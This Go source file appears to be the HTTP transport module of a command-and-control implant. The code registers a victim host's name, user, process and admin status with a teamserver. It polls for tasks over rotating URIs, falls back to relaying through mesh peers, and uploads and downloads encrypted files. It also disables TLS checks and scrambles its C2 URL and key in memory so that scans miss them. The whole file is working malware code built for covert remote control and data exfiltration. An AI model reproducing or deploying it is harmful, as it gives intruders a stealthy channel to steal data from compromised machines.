package agent

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type httpTransport struct {
	client     *http.Client
	serverURL  string
	urlBuf     []byte // mutable heap copy of serverURL registered as scramble target
	agentID    string
	aesKey     []byte
	beaconURIs []string
	uriIdx     atomic.Int64
	extraHdrs  [][2]string

	// mesh peers — updated from beacon responses; used as fallback when teamserver unreachable
	meshMu    sync.RWMutex
	meshPeers []peerWire
}

// peerWire matches the server's peerWire struct.
type peerWire struct {
	Addr  string `json:"addr"`
	Proto string `json:"proto,omitempty"`
}

// errAgentUnknown is returned by beacon() when the server no longer recognises
// this agent (HTTP 404). Run() catches this and re-registers instead of
// backing off forever with a stale agentID.
var errAgentUnknown = fmt.Errorf("agent unknown")

type registerRequest struct {
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	PID         int    `json:"pid"`
	Transport   string `json:"transport"`
	SleepSec    int    `json:"sleep_sec"`
	JitterPct   int    `json:"jitter_pct"`
	ProcessName string `json:"process_name,omitempty"`
	IsAdmin     bool   `json:"is_admin,omitempty"`
}

type registerResponse struct {
	AgentID   string `json:"agent_id"`
	AESKey    string `json:"aes_key"`
	SleepSec  int    `json:"sleep_sec"`
	JitterPct int    `json:"jitter_pct"`
}

type taskWire struct {
	ID      int64  `json:"id"`
	Type    string `json:"type"`
	Args    string `json:"args,omitempty"`
	Payload string `json:"payload,omitempty"`
}

type beaconResponse struct {
	Tasks   []taskWire `json:"tasks"`
	Peers   []peerWire `json:"peers,omitempty"`
	Padding string     `json:"_p,omitempty"`
}

type resultRequest struct {
	TaskID int64  `json:"task_id"`
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
}

func newHTTPTransport(serverURL string) *httpTransport {
	return newHTTPTransportOpts(serverURL, false)
}

// newHTTPSTransport creates an HTTP transport with TLS verification disabled.
// Used for HTTPS listeners that use self-signed server certificates.
func newHTTPSTransport(serverURL string) *httpTransport {
	return newHTTPTransportOpts(serverURL, true)
}

func newHTTPTransportOpts(serverURL string, skipTLSVerify bool) *httpTransport {
	t := &httpTransport{serverURL: serverURL}

	// HTTP proxy
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: skipTLSVerify}, //nolint:gosec
	}
	if ProxyURL != "" {
		if pu, err := url.Parse(ProxyURL); err == nil {
			tr.Proxy = http.ProxyURL(pu)
		}
	}
	t.client = &http.Client{Transport: tr, Timeout: 30 * time.Second}

	// Beacon URI rotation
	if BeaconURIs != "" {
		for _, u := range strings.Split(BeaconURIs, ",") {
			u = strings.TrimSpace(u)
			if u != "" {
				t.beaconURIs = append(t.beaconURIs, u)
			}
		}
	}

	// Extra headers
	if HttpHeaders != "" {
		for _, hdr := range strings.Split(HttpHeaders, ";") {
			hdr = strings.TrimSpace(hdr)
			if idx := strings.Index(hdr, ":"); idx > 0 {
				k := strings.TrimSpace(hdr[:idx])
				v := strings.TrimSpace(hdr[idx+1:])
				if k != "" {
					t.extraHdrs = append(t.extraHdrs, [2]string{k, v})
				}
			}
		}
	}
	// Register a mutable heap copy of the C2 URL as a sleep-mask scramble target
	// so the URL is XOR'd during sleep and not visible in memory scans.
	urlBuf := []byte(serverURL)
	t.urlBuf = urlBuf
	RegisterScramblerTarget(urlBuf)
	return t
}

func (t *httpTransport) applyHeaders(req *http.Request) {
	req.Header.Set("User-Agent", UserAgent)
	for _, h := range t.extraHdrs {
		req.Header.Set(h[0], h[1])
	}
	if HttpHeadersRemove != "" {
		for _, h := range strings.Split(HttpHeadersRemove, ",") {
			req.Header.Del(strings.TrimSpace(h))
		}
	}
}

func (t *httpTransport) beaconPath() string {
	if len(t.beaconURIs) == 0 {
		return "/beacon/" + t.agentID
	}
	idx := int(t.uriIdx.Add(1)-1) % len(t.beaconURIs)
	return t.beaconURIs[idx] + "/" + t.agentID
}

func (t *httpTransport) register(info sysInfo) error {
	sleepSec, jitterPct := parseSleepConfig()
	body, err := json.Marshal(registerRequest{
		Hostname:    info.Hostname,
		Username:    info.Username,
		OS:          info.OS,
		PID:         info.PID,
		Transport:   Transport,
		SleepSec:    sleepSec,
		JitterPct:   jitterPct,
		ProcessName: info.ProcessName,
		IsAdmin:     info.IsAdmin,
	})
	if err != nil {
		return err
	}
	req, err := http.NewRequest(http.MethodPost, t.serverURL+"/register", bytes.NewReader(body))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	t.applyHeaders(req)

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("register: status %d", resp.StatusCode)
	}
	var reg registerResponse
	if err := json.NewDecoder(resp.Body).Decode(&reg); err != nil {
		return err
	}
	t.agentID = reg.AgentID
	t.aesKey, err = base64.StdEncoding.DecodeString(reg.AESKey)
	if err == nil && len(t.aesKey) > 0 {
		RegisterScramblerTarget(t.aesKey)
	}
	return err
}

func (t *httpTransport) beacon() ([]taskWire, error) {
	req, err := http.NewRequest(http.MethodGet, t.serverURL+t.beaconPath(), nil)
	if err != nil {
		return nil, err
	}
	t.applyHeaders(req)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}
	if resp.StatusCode == http.StatusNotFound {
		return nil, errAgentUnknown
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("beacon: status %d", resp.StatusCode)
	}
	ciphertext, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	plaintext, err := open(t.aesKey, ciphertext)
	if err != nil {
		return nil, err
	}
	var br beaconResponse
	if err := json.Unmarshal(plaintext, &br); err != nil {
		return nil, err
	}
	// Save peer list for fallback use if teamserver becomes unreachable.
	if len(br.Peers) > 0 {
		t.meshMu.Lock()
		t.meshPeers = br.Peers
		t.meshMu.Unlock()
	}
	return br.Tasks, nil
}

// savedPeers returns a snapshot of the last known mesh peers.
func (t *httpTransport) savedPeers() []peerWire {
	t.meshMu.RLock()
	defer t.meshMu.RUnlock()
	out := make([]peerWire, len(t.meshPeers))
	copy(out, t.meshPeers)
	return out
}

// beaconViaPeer tries to beacon through a mesh peer acting as an HTTP relay.
// The peer must be running an HTTP pivot server that forwards to the real teamserver.
func (t *httpTransport) beaconViaPeer(peerAddr string) ([]taskWire, error) {
	peerURL := "http://" + peerAddr
	req, err := http.NewRequest(http.MethodGet, peerURL+"/beacon/"+t.agentID, nil)
	if err != nil {
		return nil, err
	}
	t.applyHeaders(req)

	// Use a short timeout so we fail fast and try the next peer.
	cl := &http.Client{Timeout: 10 * time.Second}
	resp, err := cl.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusNoContent {
		return nil, nil
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("peer beacon: status %d", resp.StatusCode)
	}
	ciphertext, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	plaintext, err := open(t.aesKey, ciphertext)
	if err != nil {
		return nil, err
	}
	var br beaconResponse
	if err := json.Unmarshal(plaintext, &br); err != nil {
		return nil, err
	}
	return br.Tasks, nil
}

func (t *httpTransport) sendResult(taskID int64, output, errStr string) error {
	plaintext, err := json.Marshal(resultRequest{TaskID: taskID, Output: output, Error: errStr})
	if err != nil {
		return err
	}
	ciphertext, err := seal(t.aesKey, plaintext)
	if err != nil {
		return err
	}
	req, err := http.NewRequest(http.MethodPost,
		t.serverURL+"/result/"+t.agentID,
		bytes.NewReader(ciphertext))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	t.applyHeaders(req)
	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("sendResult: server returned %d", resp.StatusCode)
	}
	return nil
}

func (t *httpTransport) uploadFile(taskID int64, filename string, data []byte) error {
	ciphertext, err := seal(t.aesKey, data)
	if err != nil {
		return err
	}
	req, err := http.NewRequest(http.MethodPost,
		fmt.Sprintf("%s/upload/%s/%s", t.serverURL, t.agentID, filename),
		bytes.NewReader(ciphertext))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/octet-stream")
	t.applyHeaders(req)
	t.client.Timeout = 5 * time.Minute // large uploads can be slow
	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("upload: server returned %d", resp.StatusCode)
	}
	return nil
}

func (t *httpTransport) downloadFile(filename string) ([]byte, error) {
	req, err := http.NewRequest(http.MethodGet,
		fmt.Sprintf("%s/dl/%s/%s", t.serverURL, t.agentID, filename),
		nil)
	if err != nil {
		return nil, err
	}
	t.applyHeaders(req)
	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("download: status %d", resp.StatusCode)
	}
	ciphertext, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	return open(t.aesKey, ciphertext)
}

func (t *httpTransport) agentIDStr() string { return t.agentID }
